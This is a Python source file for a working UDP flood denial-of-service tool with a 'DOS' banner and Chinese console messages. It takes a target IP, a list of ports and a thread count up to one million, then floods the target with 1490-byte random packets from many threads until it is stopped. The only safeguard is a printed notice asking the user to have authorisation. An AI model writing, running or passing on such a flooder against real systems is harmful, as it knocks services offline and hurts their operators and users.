import time
import socket
import random
import threading
import sys
import argparse
from datetime import datetime

title = """
            ____   ___  ____  
           |  _ \ / _ \/ ___| 
           | | | | | | \___ \ 
           | |_| | |_| |___) |
           |____/ \___/|____/ 
"""

class Attack:
    def __init__(self, ip, ports, threads):
        now = datetime.now()
        self.hour = now.hour
        self.minute = now.minute
        self.day = now.day
        self.month = now.month
        self.year = now.year
        self.ip = ip
        self.ports = ports
        self.speed = 1000  # Fixed speed as requested
        self.threads = threads
        self.counter = 0
        self.lock = threading.Lock()
        self.running = True
        self.sockets = []
    
    def attack_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sockets.append(sock)
            bytes = random._urandom(1490)
            while self.running:
                try:
                    sock.sendto(bytes, (self.ip, port))
                    with self.lock:
                        self.counter += 1
                        if self.counter % 100 == 0:
                            ports_str = ','.join(map(str, self.ports))
                            print(f"已发送 {self.counter} 个 UDP 数据包", end="\r")
                    time.sleep((1000 - self.speed) / 2000)
                except socket.error as e:
                    print(f"\n网络错误: {e}")
                    break
                except Exception as e:
                    print(f"\n未知错误: {e}")
                    break
        except Exception as e:
            print(f"\n创建socket错误: {e}")
    
    def start(self):
        print(f"\n攻击信息\n{'-' * 50}\n目标IP: {self.ip}\n攻击速度: {self.speed}\n攻击端口: {self.ports}\n线程数量: {self.threads}\n{'-' * 50}")
        try:
            threads_per_port = max(1, self.threads // len(self.ports))
            for port in self.ports:
                for _ in range(threads_per_port):
                    thread = threading.Thread(target=self.attack_port, args=(port,))
                    thread.daemon = True
                    thread.start()
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.running = False
                print("\n正在停止攻击...")
                time.sleep(1)
        finally:
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass
            
            print(f"\n攻击已停止")
            print(f"总共发送了 {self.counter} 个数据包")

def parse_arguments():
    parser = argparse.ArgumentParser(description='UDP Flood Attack Tool')
    parser.add_argument('-ip', '--ip', required=True, help='Target IP address')
    parser.add_argument('-port', '--ports', required=True, help='Port(s) to attack (comma-separated)')
    parser.add_argument('-t', '--threads', type=int, required=True, help='Number of threads')
    return parser.parse_args()

def DOS_thread_dos_main():
    print(title)
    print("[安全警告]")
    print("-" * 40)
    print("1. 请确保您有目标网站的访问授权")
    print("2. 高频请求可能导致IP被封禁")
    print("3. 按 Ctrl+C 停止攻击")
    print("4. 请使用 IPV4 地址, 否则其他 IP 不支持")
    print("-" * 40)
    
    try:
        args = parse_arguments()
        
        # Validate IP (basic validation)
        if not args.ip:
            raise ValueError("IP地址不能为空")
            
        # Parse and validate ports
        ports = []
        for p in args.ports.split(','):
            port = p.strip()
            if not port.isdigit() or not (0 < int(port) <= 65535):
                raise ValueError(f"无效端口号: {port}")
            ports.append(int(port))
            
        # Validate threads
        if not (1 <= args.threads <= 1000000):
            raise ValueError("线程数量必须在1 ~ 1000000之间")
            
        attack = Attack(args.ip, ports, args.threads)
        attack.start()
    except Exception as e:
        print(f"\n程序异常: {e}")
    finally:
        print("\n程序退出")

if __name__ == "__main__":
    DOS_thread_dos_main()